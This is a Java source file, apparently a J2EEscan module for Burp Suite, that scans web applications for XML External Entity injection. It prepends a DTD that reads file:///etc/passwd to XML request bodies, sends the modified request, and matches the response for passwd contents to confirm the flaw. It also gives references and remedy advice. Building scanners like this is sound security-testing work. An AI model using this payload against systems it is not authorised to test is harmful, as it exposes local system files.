package burp.j2ee.issues.impl;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Extended detection for XXE attacks
 * 
 */
public class XXEModule implements IModule{

    private static final String TITLE = "XML Security - XML External Entities Injection (XXE)";
    private static final String DESCRIPTION = "J2EEscan detect a XML External Entities Injection vulnerability.<br />"
            + "The XML parsing library supports the use of custom entity references in the XML document; custom entities "
            + "can be defined by including a user defined <pre>DOCTYPE</pre> that reference an external resource to be included.<br /> "
            + "This option could be abused to carry on XXE attacks, leading to <i>DoS</i> conditions, "
            + "local file include, internal LAN scanning and <i>SSRF</i> attacks. "
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing<br />"
            + "https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf<br />"
            + "http://en.wikipedia.org/wiki/Billion_laughs<br />"
            + "http://docs.spring.io/spring-ws/site/reference/html/oxm.html<br />"
            + "https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61702260<br />"
            + "https://github.com/pwntester/BlockingServer<br />"
            + "http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf<br />"
            + "http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html<br />";
    
    private static final String REMEDY = "It's reccomended to disable <pre>DOCTYPE</pre> resolution in the XML library; "
            + "an upgrade of XML library component usually is needed to fix this vulnerability<br />"
            + "https://github.com/jmurty/java-xmlbuilder/issues/6<br />"
            + "https://www.java.net/xxe-xml-external-entity-attack-jaxb-and-jersey<br />"
            + "<strong>JAXB</strong><br />"
            + "Disable the following properties <pre>IS_SUPPORTING_EXTERNAL_ENTITIES</pre> and"
            + " <pre>XMLInputFactory.SUPPORT_DTD</pre><br /><br />";

    private static final String XXE_DTD_DEFINITION = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>";

    private static final List<byte[]> XXE_INJECTION_TESTS = Arrays.asList(
            "&xxe;".getBytes());

    private static final List<Pattern> XXE_RE_MATCHES = Arrays.asList(
            Pattern.compile("root:.*:0:[01]:", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
            Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
            Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    private static final List<Pattern> XXE_RE_FAIL = Arrays.asList(
            Pattern.compile("DOCTYPE is not allowed", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
            Pattern.compile("DOCTYPE is disallowed", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
            Pattern.compile("DTD is prohibited in this XML document", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE)
    );
    private PrintWriter stdout;
    
    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();
        stdout = new PrintWriter(callbacks.getStdout(), true);
        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        IResponseInfo respInfo = callbacks.getHelpers().analyzeResponse(baseRequestResponse.getResponse());

        // Skip test if there is no XML request body
        if (IRequestInfo.CONTENT_TYPE_XML != reqInfo.getContentType()){
            return issues;
        }        
        
        byte[] responseByte = baseRequestResponse.getResponse();
        byte[] requestByte = baseRequestResponse.getRequest();
                
        List reqHeaders = callbacks.getHelpers().analyzeRequest(requestByte).getHeaders();        
        String resp = callbacks.getHelpers().bytesToString(responseByte);
        

        for (byte[] INJ_TEST : XXE_INJECTION_TESTS) {
            
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);
            
            IRequestInfo a = callbacks.getHelpers().analyzeRequest(checkRequest);
            String req = callbacks.getHelpers().bytesToString(checkRequest);
            String body = req.substring(reqInfo.getBodyOffset());
                    
            // Remove XML version, and append malicious DTD
            // <?xml version="1.0" encoding="UTF-8" standalone="no"?>
            body = body.replaceAll("<\\?xml(.+?)\\?>", "").trim();
            body = XXE_DTD_DEFINITION + body;
            // TODO FIX ME unwanted encoded payload inserted by burp
            body = body.replaceAll("&amp;xxe;", "&xxe;");
            
            byte[] evilMessage = callbacks.getHelpers().buildHttpMessage(a.getHeaders(), callbacks.getHelpers().stringToBytes(body));
            
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), evilMessage);

            String response = helpers.bytesToString(checkRequestResponse.getResponse());

            // Check if the remote XML Library is not vulnerable based on java
            // xml library error message
            for (Pattern xxeFail : XXE_RE_FAIL){
                Matcher matcherXXEFail = xxeFail.matcher(response);
                if (matcherXXEFail.find()) {
                    stdout.println("Skipping XXE test, library seems to disallow XXE on url " + reqInfo.getUrl());
                    return issues;
                }
            }
            
            for (Pattern xxeMatcher : XXE_RE_MATCHES) {

                Matcher matcher = xxeMatcher.matcher(response);
                
                if (matcher.find()) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            XXEModule.TITLE,
                            XXEModule.DESCRIPTION,
                            XXEModule.REMEDY,
                            Risk.High,
                            Confidence.Certain));

                    // Return at first XXE instance detected
                    return issues;
                }
            }
        }

        return issues;
    }
}